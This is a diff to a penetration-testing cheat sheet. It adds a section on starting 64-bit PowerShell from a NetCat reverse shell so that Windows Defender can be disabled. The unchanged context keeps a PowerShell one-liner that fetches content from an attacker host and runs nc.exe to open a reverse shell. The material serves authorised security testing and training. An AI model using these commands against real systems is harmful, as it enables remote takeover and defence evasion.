@@ -29,6 +29,7 @@ Table of Contents
       * [Sharing files with Windows machine](#sharing-files-with-windows-machine)
       * [From DNSAdmin group to Administrators](#from-dnsadmin-to-administrator)
       * [From Exchange Windows Permissions group to Administrators](#from-exchange-windows-permissions-group-to-administrators)
+      * [Execute the x64 PowerShell] (#execute-the-x64-powershell)
    * [Post Explotation Windows](#post-explotation-windows)
       * [Extract locally saved NTLM from Windows](#extract-locally-saved-ntlm-from-windows)
       * [Adding Firewall rules](#adding-firewall-rules)
@@ -36,7 +37,7 @@ Table of Contents
       * [From Docker group to root](#from-docker-group-to-root)
       * [Retrieving data from MemCache](#retrieving-data-from-memcache)
       * [Uploading Malicious Packages to PyPi Server](#uploading-malicious-packages-to-pypi-server)
-   * [Active Directory]
+   * [Active Directory](#active-directory)
       * [Bloodhound] (#bloodhound)
    * [Pivoting](#pivoting)
       * [Local Port Forward with Netsh](#local-port-forward-with-netsh)
@@ -172,6 +173,13 @@ powershell.exe -NoProfile -ExecutionPolicy unrestricted -Command IEX (New-Object
 
 ```cmd
 powershell.exe -NoProfile -ExecutionPolicy unrestricted -Command IEX (New-Object Net.WebClient).DownloadString('http://[LOCAL-IP]/nc.exe');nc.exe -e cmd.exe [LOCAL-IP] [PORT]
+```
+
+## Execute the x64 PowerShell
+It would be necessary, in some situations, to execute the x64 version (which is normally executed by default just launching 'powershell.exe'). For instance, in some situations I have found that, from a NetCat reverse shell, when I executed 'powershell.exe' I got a x86 powershell and it could be anoying to do somethings like the WindowsDefender disable (since the command needed to achieve that is not compatible with x86 architecute)
+
+```powershell
+%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe
 ```
 
 # PrivEsc on Windows
